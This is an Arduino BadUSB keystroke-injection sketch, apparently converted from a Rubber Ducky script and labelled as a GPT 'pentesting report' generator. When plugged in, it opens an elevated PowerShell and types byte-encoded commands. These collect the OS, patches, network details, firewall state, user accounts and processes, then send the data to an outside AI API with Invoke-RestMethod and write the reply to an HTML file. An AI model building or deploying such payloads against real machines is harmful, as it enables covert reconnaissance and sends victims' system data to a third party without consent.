const uint8_t key_arr_37[] PROGMEM = {2,22, 0,8, 0,23, 0,45, 2,6, 0,18, 0,17, 0,23, 0,8, 0,17, 0,23, 0,44, 0,45, 2,19, 0,4, 0,23, 0,11, 0,44, 2,33, 0,8, 0,17, 0,25, 2,51, 2,24, 2,22, 2,8, 2,21, 2,19, 2,21, 2,18, 2,9, 2,12, 2,15, 2,8, 0,49, 2,7, 0,8, 0,22, 0,14, 0,23, 0,18, 0,19, 0,49, 2,19, 0,8, 0,17, 0,23, 0,8, 0,22, 0,23, 0,12, 0,17, 0,10, 2,45, 2,21, 0,8, 0,19, 0,18, 0,21, 0,23, 0,55, 0,11, 0,23, 0,16, 0,15, 0,44, 0,45, 2,25, 0,4, 0,15, 0,24, 0,8, 0,44, 2,33, 0,11, 0,23, 0,16, 0,15, 2,6, 0,18, 0,17, 0,23, 0,8, 0,17, 0,23};
// (Get-Content $env:USERPROFILEbslashDesktopbslashPentesting_Report.html).Replace('COMPUTER_NAME_PLACEHOLDER', $system_info.ComputerName).Replace('NETWORK_INFO_PLACEHOLDER', ($system_info.NetworkInfo -join ', ')).Replace('USER_ACCOUNTS_PLACEHOLDER', ($system_info.UserAccounts -join ', ')) | Set-Content $env:USERPROFILEbslashDesktopbslashPentesting_Report.html
const uint8_t key_arr_38[] PROGMEM = {2,38, 2,10, 0,8, 0,23, 0,45, 2,6, 0,18, 0,17, 0,23, 0,8, 0,17, 0,23, 0,44, 2,33, 0,8, 0,17, 0,25, 2,51, 2,24, 2,22, 2,8, 2,21, 2,19, 2,21, 2,18, 2,9, 2,12, 2,15, 2,8, 0,49, 2,7, 0,8, 0,22, 0,14, 0,23, 0,18, 0,19, 0,49, 2,19, 0,8, 0,17, 0,23, 0,8, 0,22, 0,23, 0,12, 0,17, 0,10, 2,45, 2,21, 0,8, 0,19, 0,18, 0,21, 0,23, 0,55, 0,11, 0,23, 0,16, 0,15, 2,39, 0,55, 2,21, 0,8, 0,19, 0,15, 0,4, 0,6, 0,8, 2,38, 0,52, 2,6, 2,18, 2,16, 2,19, 2,24, 2,23, 2,8, 2,21, 2,45, 2,17, 2,4, 2,16, 2,8, 2,45, 2,19, 2,15, 2,4, 2,6, 2,8, 2,11, 2,18, 2,15, 2,7, 2,8, 2,21, 0,52, 0,54, 0,44, 2,33, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,45, 0,12, 0,17, 0,9, 0,18, 0,55, 2,6, 0,18, 0,16, 0,19, 0,24, 0,23, 0,8, 0,21, 2,17, 0,4, 0,16, 0,8, 2,39, 0,55, 2,21, 0,8, 0,19, 0,15, 0,4, 0,6, 0,8, 2,38, 0,52, 2,17, 2,8, 2,23, 2,26, 2,18, 2,21, 2,14, 2,45, 2,12, 2,17, 2,9, 2,18, 2,45, 2,19, 2,15, 2,4, 2,6, 2,8, 2,11, 2,18, 2,15, 2,7, 2,8, 2,21, 0,52, 0,54, 0,44, 2,38, 2,33, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,45, 0,12, 0,17, 0,9, 0,18, 0,55, 2,17, 0,8, 0,23, 0,26, 0,18, 0,21, 0,14, 2,12, 0,17, 0,9, 0,18, 0,44, 0,45, 0,13, 0,18, 0,12, 0,17, 0,44, 0,52, 0,54, 0,44, 0,52, 2,39, 2,39, 0,55, 2,21, 0,8, 0,19, 0,15, 0,4, 0,6, 0,8, 2,38, 0,52, 2,24, 2,22, 2,8, 2,21, 2,45, 2,4, 2,6, 2,6, 2,18, 2,24, 2,17, 2,23, 2,22, 2,45, 2,19, 2,15, 2,4, 2,6, 2,8, 2,11, 2,18, 2,15, 2,7, 2,8, 2,21, 0,52, 0,54, 0,44, 2,38, 2,33, 0,22, 0,28, 0,22, 0,23, 0,8, 0,16, 2,45, 0,12, 0,17, 0,9, 0,18, 0,55, 2,24, 0,22, 0,8, 0,21, 2,4, 0,6, 0,6, 0,18, 0,24, 0,17, 0,23, 0,22, 0,44, 0,45, 0,13, 0,18, 0,12, 0,17, 0,44, 0,52, 0,54, 0,44, 0,52, 2,39, 2,39, 0,44, 2,49, 0,44, 2,22, 0,8, 0,23, 0,45, 2,6, 0,18, 0,17, 0,23, 0,8, 0,17, 0,23, 0,44, 2,33, 0,8, 0,17, 0,25, 2,51, 2,24, 2,22, 2,8, 2,21, 2,19, 2,21, 2,18, 2,9, 2,12, 2,15, 2,8, 0,49, 2,7, 0,8, 0,22, 0,14, 0,23, 0,18, 0,19, 0,49, 2,19, 0,8, 0,17, 0,23, 0,8, 0,22, 0,23, 0,12, 0,17, 0,10, 2,45, 2,21, 0,8, 0,19, 0,18, 0,21, 0,23, 0,55, 0,11, 0,23, 0,16, 0,15};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        keyboard::type(pgm_read_byte_near(keys + i+1), 0, 0, 0, 0, 0, pgm_read_byte_near(keys + i));
    }
}

void setup() {
    keyboard::begin();
    delay(2000);

    // Author: ryanshatch
    // Open PowerShell
    delay(500); // DELAY 500
    keyboard::type(27, 0, 0, 0, 0, 0, 8); // GUI x
    delay(2000); // DELAY 2000
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING a
    delay(2000); // DELAY 2000
    keyboard::type(80, 0, 0, 0, 0, 0, 0); // LEFTARROW
    delay(2000); // DELAY 2000
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    // Create PowerShell script to gather system information
    delay(500); // DELAY 500
    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING $system_info = @{
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_2, sizeof(key_arr_2)); // STRING 'OS' = $(Get-CimInstance Win32_Operatin...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_3, sizeof(key_arr_3)); // STRING 'Version' = $(Get-CimInstance Win32_Ope...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_4, sizeof(key_arr_4)); // STRING 'Architecture' = $(Get-CimInstance Win3...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_5, sizeof(key_arr_5)); // STRING 'ComputerName' = $(Get-CimInstance Win3...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_6, sizeof(key_arr_6)); // STRING 'LastBootTime' = $(Get-CimInstance Win3...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_7, sizeof(key_arr_7)); // STRING 'InstalledUpdates' = $(Get-HotFix | Sor...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_8, sizeof(key_arr_8)); // STRING 'NetworkInfo' = $(Get-CimInstance Win32...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_9, sizeof(key_arr_9)); // STRING 'FirewallStatus' = $(Get-NetFirewallPro...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_10, sizeof(key_arr_10)); // STRING 'UserAccounts' = $(Get-LocalUser | Wher...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_11, sizeof(key_arr_11)); // STRING 'RunningProcesses' = $(Get-Process | So...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_12, sizeof(key_arr_12)); // STRING }
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    // Requesting GPT to format response in HTML
    delay(500); // DELAY 500
    duckyString(key_arr_13, sizeof(key_arr_13)); // STRING $prompt_text = "Given the detailed syst...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_14, sizeof(key_arr_14)); // STRING $messages = @(
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(1000); // DELAY 1000
    duckyString(key_arr_15, sizeof(key_arr_15)); // STRING @{ 'role' = 'system'; 'content' = 'You ...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(1000); // DELAY 1000
    duckyString(key_arr_16, sizeof(key_arr_16)); // STRING @{ 'role' = 'user'; 'content' = $prompt...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(1000); // DELAY 1000
    duckyString(key_arr_17, sizeof(key_arr_17)); // STRING )
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_18, sizeof(key_arr_18)); // STRING $headers = @{ 'Authorization' = 'Bearer...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_19, sizeof(key_arr_19)); // STRING $response = Invoke-RestMethod -Uri 'htt...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_20, sizeof(key_arr_20)); // STRING $htmlContent = @"
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_21, sizeof(key_arr_21)); // STRING <html>
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_22, sizeof(key_arr_22)); // STRING <head>
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_23, sizeof(key_arr_23)); // STRING <title>Pentesting Report BadUSB-GPT</ti...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_24, sizeof(key_arr_24)); // STRING <style>
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_25, sizeof(key_arr_25)); // STRING body {font-family: Arial, sans-serif; m...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_26, sizeof(key_arr_26)); // STRING h2 {color: #333; border-bottom: 2px sol...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_27, sizeof(key_arr_27)); // STRING h3 {color: #555; margin-top: 20px;}
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_28, sizeof(key_arr_28)); // STRING p, ul {margin-bottom: 20px;}
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_29, sizeof(key_arr_29)); // STRING </style>
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_30, sizeof(key_arr_30)); // STRING </head>
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_31, sizeof(key_arr_31)); // STRING <body>
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_32, sizeof(key_arr_32)); // STRING <h2>Pentesting Report</h2>
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_33, sizeof(key_arr_33)); // STRING $($response.choices[0].message.content)
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_34, sizeof(key_arr_34)); // STRING </body>
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_35, sizeof(key_arr_35)); // STRING </html>
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_36, sizeof(key_arr_36)); // STRING "@
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(500); // DELAY 500
    duckyString(key_arr_37, sizeof(key_arr_37)); // STRING Set-Content -Path $env:USERPROFILEbslas...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    // Replacing placeholders with actual values in the local report
    delay(500); // DELAY 500
    duckyString(key_arr_38, sizeof(key_arr_38)); // STRING (Get-Content $env:USERPROFILEbslashDesk...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
}

void loop() {}

// Created using duckify.huhn.me @ dev 89adab6e
